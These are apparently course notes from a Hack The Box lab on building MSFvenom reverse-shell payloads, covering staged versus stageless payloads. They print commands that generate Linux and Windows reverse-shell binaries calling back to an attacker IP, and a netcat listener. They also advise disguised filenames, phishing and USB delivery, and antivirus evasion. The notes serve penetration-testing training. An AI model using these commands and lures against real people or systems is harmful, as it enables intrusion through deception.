# Crafting Payloads with MSFvenom

To run the exploit module, deliver the payload, and establish the shell session, we needed to communicate with the system in the first place. This may have been possible through having a presence on the internal network or a network that has routes into the network where the target resides. There will be situations where we do not have direct network access to a vulnerable target machine.

In these cases, we will need to get crafty in how the payload gets delivered and executed on the system. One such way may be to use MSFvenom to craft a payload and send it via email message or other means of social engineering to drive that user to execute the file.

In addition to providing a payload with flexible delivery options, MSFvenom also allows us to encrypt & encode payloads to bypass common anti-virus detection signatures. Let's practice a bit with these concepts.

## Staged vs. Stageless Payloads

Staged payload creates a way for us to send more components of our attacks like staging for a big event.

When run using an exploit module in Metasploit, this payload will send a small stage that will be executed on the target and then call back to the attack box to download the remainder of the payload over the network, then executes the shellcode to establish a reverse shell.

 if we use Metasploit to run this payload, we will need to configure options to point to the proper IPs and port so the listener will successfully catch the shell. Keep in mind that a stage also takes up space in memory which leaves less space for the payload. What happens at each stage could vary depending on the payload.

 ` Stageless` payload do not have stage. for example `linux/zarch/meterpreter_reverse_tcp` 
 Using an exploit module in Metasploit, this payload will be sent in its entirety across a network connection without a stage. This could benefit us in environments where we do not have access to much bandwidth and latency can interfere. Staged payloads could lead to unstable shell sessions in these environments, so it would be best to select a stageless payload. In addition to this, stageless payloads can sometimes be better for evasion purposes due to less traffic passing over the network to execute the payload, especially if we deliver it by employing social engineering. This concept is also very well explained by Rapid 7 in this blog post on [stageless Meterpreter payloads.](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/)

 

### Building A Stageless Payload

#### BUILD IT

```
NiteshKS22@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

Creates the .elf binary and names the file createbackup. We can name this file whatever we want. Ideally, we would call it something inconspicuous and/or something someone would be tempted to download and execute.

### Executing a stageless Payload

At this point, we have the payload created on our attack box. We would now need to develop a way to get that payload onto the target system. There are countless ways this can be done. Here are just some of the common ways:

- Email message with the file attached.
- Download link on a website.
- Combined with a Metasploit exploit module (this would likely require us to already be on the internal network).
- Via flash drive as part of an onsite penetration test.

Once the file is on that system, it will also need to be executed.

Imagine for a moment: the target machine is an Ubuntu box that an IT admin uses to manage network devices (hosting configuration scripts, accessing routers & switches, etc.). We could get them to click the file in an email we sent because they were carelessly using this system as if it was a personal computer or workstation.

#### NC Connection 

```
NiteshKS22@htb[/htb]$ sudo nc -lvnp 443
```

when file executed we can see the shell

### Building a simple Stageless Payload for a Windows system

```
NiteshKS22@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

when this executed on the windows system we can see
